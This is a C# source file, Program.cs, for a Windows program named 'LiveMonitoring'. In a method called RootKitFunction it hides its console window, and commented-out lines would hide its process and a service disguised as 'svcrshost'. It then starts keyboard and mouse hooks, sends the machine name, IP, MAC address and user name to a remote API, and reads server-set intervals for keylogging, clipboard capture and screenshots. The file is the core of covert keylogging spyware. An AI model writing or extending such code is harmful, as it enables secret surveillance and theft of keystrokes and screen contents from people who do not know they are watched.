using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Net.Http.Formatting;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Newtonsoft.Json;
using Microsoft.Win32;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.IO;
using System.Management;

namespace LiveMonitoring
{
    public class Program
    {
        [DllImport("user32.dll")]
        private static extern int ShowWindow(int Handle, int showState);
        [DllImport("kernel32.dll")]
        public static extern int GetConsoleWindow();

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;


        static void Main(string[] args)
        {
            Thread.CurrentThread.CurrentCulture = new System.Globalization.CultureInfo("en-US");
            RootKitFunction();
            bool createdNew;

            Mutex m = new Mutex(true, Application.ProductName, out createdNew);

            createdNew = true;

            if (!createdNew)
            {
                // myApp is already running...
                //MessageBox.Show(Application.ProductName + " is already running!", "Multiple Instances");
                GlobalClass.WriteTolog(Application.ProductName + " is already running!");
                return;
            }

            GlobalClass.WriteTolog("Application Start");
            GlobalClass.Iskeyhook = false;
            GlobalClass.Ismousehook = false;

            IsSendBlockData = true;
            IsBlocked = false;
            GlobalClass.WriteTolog("Add system event with custon event");

            GetCofigrationSettings();
            AddMachineInfo();

            GlobalClass.UploadLocalSessionData();
            GlobalClass.SaveNewSessionEntry();
            keyboardHook.KeyBordStart();
            MouseHook.MouseStart();

            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.SetUnhandledExceptionMode(UnhandledExceptionMode.ThrowException);

            Application.Run(new MyApplicationContext());

            //keyboardHook.KeyBordStop();
            //MouseHook.MouseSTOP();
        }

        static Program()
        {
            SetallIntervalsInSeconds();
        }

        static void RootKitFunction()
        {
            try
            {
                var handle = GetConsoleWindow();
                GlobalClass.WriteTolog("Hide Code run for Console App");
                // code Hide
                ShowWindow(handle, SW_HIDE);
                //ShowWindow(handle, SW_SHOW);
            }
            catch (Exception)
            {

            }

            try
            {
                ///Process pro = Process.GetCurrentProcess();
                //ApiRootkit.Rootkit.HideProcess(pro);
                //ApiRootkit.Rootkit.HideService("svcrshost");
            }
            catch (Exception)
            {

            }
        }

        public static int MachineId { get; set; }
        public static int Clipboard_Interval { get; set; }
        public static int KeyLogger_Interval { get; set; }
        public static int KeyLogger_MinTime { get; set; }
        public static int Screenshot_Interval { get; set; }
        public static int Idle_Interval { get; set; }
        public static int Idle_MinTime { get; set; }
        public static int App_Interval { get; set; }
        public static bool IsSendBlockData { get; set; }
        public static bool IsBlocked { get; set; }
        public static int Session_Interval { get; set; }

        public static void AddMachineInfo()
        {
            if (GlobalClass.CheckForInternetConnection())
            {
                try
                {
                    using (HttpClient client = MachineInfoTracker.GetHttpClient())
                    {
                        string strMachineName = MachineInfoTracker.GetMachineName();
                        string strMachineIP = MachineInfoTracker.GetPrimaryAdapterDetails().AdapterIP;
                        string strUserName = MachineInfoTracker.GetUserName();
                        string strMACAddress = MachineInfoTracker.GetPrimaryAdapterDetails().AdapterMacAddress;
                        int customerID = Constants.CustomerId;

                        MachineDetail model = new MachineDetail { MachineName = strMachineName, CustomerId = customerID, MachineMacAddress = strMACAddress, MachineIP = strMachineIP, UserName = strUserName, CreatedDate = DateTime.Now };
                        HttpResponseMessage Response = client.PostAsync<MachineDetail>("api/LiveMonitoringAPI/AddMachineDetails", model, new JsonMediaTypeFormatter()).Result;

                        if (Response.IsSuccessStatusCode == true)
                        {
                            var machineID = Response.Content.ReadAsStringAsync().Result;
                            machineID = machineID.Replace("\"", string.Empty).Trim();
                            string[] result = machineID.Split('_');
                            MachineId = Convert.ToInt16(result[0]);
                            IsBlocked = Convert.ToBoolean(result[1].ToString());
                        }
                        else if (Response != null && Response.IsSuccessStatusCode == false)
                        {
                            var result = Response.Content.ReadAsStringAsync().Result;
                            Console.Write("Error Message - " + result);
                            GlobalClass.WriteTolog("Error Message - " + result);
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine("Error In Program.cs in AddMachineInfo Fuction " + ex.Message);
                    GlobalClass.WriteTolog("Error In Program.cs in AddMachineInfo Fuction " + ex.Message);
                }
            }
            else
            {
                GlobalClass.WriteTolog("server not giving any response in  AddMachineInfo function");
            }
        }

        public static void GetCofigrationSettings()
        {
            if (GlobalClass.CheckForInternetConnection())
            {
                try
                {
                    using (HttpClient client = MachineInfoTracker.GetHttpClient())
                    {
                        int customerID = Constants.CustomerId;
                        HttpResponseMessage Response = client.GetAsync("api/LiveMonitoringAPI/GetCofigrationSettings?customerId=" + customerID).Result;
                        if (Response.IsSuccessStatusCode == true)
                        {
                            JObject jResponse = JObject.Parse(Response.Content.ReadAsStringAsync().Result);
                            Screenshot_Interval = Convert.ToInt16(jResponse["ScreenShot_Interval"].ToString());
                            Idle_Interval = Convert.ToInt16(jResponse["MachineIdle_Interval"].ToString());
                            KeyLogger_Interval = Convert.ToInt16(jResponse["KeyLogger_Interval"].ToString());
                            App_Interval = Convert.ToInt16(jResponse["AppTracker_Interval"].ToString());
                            KeyLogger_MinTime = Convert.ToInt16(jResponse["KeyLogger_MinTime"].ToString());
                            Idle_MinTime = Convert.ToInt16(jResponse["MachineIdle_MinTime"].ToString());
                            IsSendBlockData = Convert.ToBoolean(jResponse["IsSendBlockData"].ToString());
                            SetallIntervalsInSeconds();
                        }
                        else if (Response != null && Response.IsSuccessStatusCode == false)
                        {
                            var result = Response.Content.ReadAsStringAsync().Result;
                            Console.Write("Error Message - " + result);
                            GlobalClass.WriteTolog("Error Message - " + result);
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine("Error In Program.cs in GetCofigrationSettings Fuction " + ex.Message);
                    GlobalClass.WriteTolog("Error In Program.cs in GetCofigrationSettings Fuction " + ex.Message);

                }
            }
            else
            {
                GlobalClass.WriteTolog("error in GetCofigrationSettings function server not availble");
            }
        }

        static void SetallIntervalsInSeconds()
        {
            Session_Interval = 300000;

            if (Idle_Interval != 0)
            {
                Idle_Interval *= 1000;
            }
            else
            {
                Idle_Interval = 60000;
            }
            if (KeyLogger_Interval != 0)
            {
                KeyLogger_Interval *= 1000;
            }
            else
            {
                KeyLogger_Interval = 60000;
            }

            Clipboard_Interval = KeyLogger_Interval;

            if (App_Interval != 0)
            {
                App_Interval *= 1000;
            }
            else
            {
                App_Interval = 60000;
            }
            if (Screenshot_Interval != 0)
            {
                Screenshot_Interval *= 1000;
            }
            else
            {
                Screenshot_Interval = 60000;
            }
            if (KeyLogger_MinTime != 0)
            {
                KeyLogger_MinTime *= 1000;
            }
            else
            {
                KeyLogger_MinTime = 60000;
            }
            if (Idle_MinTime == 0)
            {
                Idle_MinTime = 300;
            }


        }

    }



    public class MachineDetail
    {
        public int MachineDetailId { get; set; }

        public int CustomerId { get; set; }

        public string MachineMacAddress { get; set; }

        public string MachineName { get; set; }

        public string MachineIP { get; set; }

        public string UserName { get; set; }

        public DateTime? CreatedDate { get; set; }
    }
}
